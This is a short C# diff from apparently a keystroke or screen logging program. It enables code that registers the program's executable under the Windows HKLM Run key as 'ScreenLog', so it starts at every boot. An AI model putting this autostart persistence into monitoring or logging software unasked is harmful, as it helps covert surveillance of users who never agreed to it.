@@ -41,22 +41,22 @@ namespace keystroke
                 return;
 
 
-            //try
-            //{
-            //    RegistryKey read = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
-            //    object currentValue = read.GetValue("ScreenLog");
+            try
+            {
+                RegistryKey read = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
+                object currentValue = read.GetValue("ScreenLog");
 
-            //    if (currentValue == null || String.Compare(currentValue.ToString(), Application.ExecutablePath, true) != 0)
-            //    {
-            //        RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            //        add.SetValue("ScreenLog", Application.ExecutablePath);
-            //    }
-            //}
-            //catch (Exception ex)
-            //{
-            //    MessageBox.Show("Please run as administrator");
-            //    //return;
-            //}
+                if (currentValue == null || String.Compare(currentValue.ToString(), Application.ExecutablePath, true) != 0)
+                {
+                    RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    add.SetValue("ScreenLog", Application.ExecutablePath);
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Please run as administrator");
+                //return;
+            }
 
             readConfigFile();
             getWordList();
